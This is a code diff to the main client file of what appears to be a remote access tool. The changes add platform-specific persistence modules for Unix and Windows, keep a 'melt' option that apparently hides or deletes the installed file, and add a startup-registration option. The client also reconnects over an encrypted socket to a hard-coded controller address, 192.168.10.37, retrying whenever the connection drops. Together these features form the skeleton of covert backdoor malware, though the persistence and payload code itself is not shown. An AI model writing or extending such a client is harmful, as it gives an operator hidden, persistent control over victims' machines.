@@ -9,12 +9,24 @@ import socket
 import os
 import sys
 
+import cryptography
+
 # append path, needed for all 'main' files
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
 
 from src.args import Args
 from src import errors
-from src.client import persistence
+
+from src.definitions import platforms
+
+if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+    from src.client.persistence.unix import Unix as Persistence
+elif platforms.OS == platforms.WINDOWS:
+    from src.client.persistence.windows import Windows as Persistence
+else:
+    print("Platform not supported")
+    sys.exit(0)
+
 from src.client.socket import Socket
 from src import logger
 
@@ -30,25 +42,27 @@ class MainClient:
         self.host = socket.gethostbyname(host) if is_host_name else host
         self.port = port
 
-        if melt:
-            persistence.melt()
+        p = Persistence()
 
-        if add_to_startup:
-            try:
-                persistence.add_startup()
-            except errors.ClientSocket.Persistence.StartupError:
-                pass
+        try:
+            if melt:
+                p.melt()
+
+            if add_to_startup:
+                p.add_startup()
+        except (errors.ClientSocket.Persistence.StartupError, NotImplementedError):
+            pass
 
     def start(self):
         self.socket = Socket(self.host, self.port)
 
         try:
             self.socket.connect()
-        except socket.error:  # if the server closes without warning
+        except (cryptography.fernet.InvalidToken, socket.error):  # if the server closes without warning
             self.socket.close()
             del self.socket
             self.start()
 
 
-if __name__ == "__main__": 
-    MainClient('127.0.0.1', 3000, False, False, False).start()
+if __name__ == "__main__":
+    MainClient('192.168.10.37', 3000, False, False, False).start()
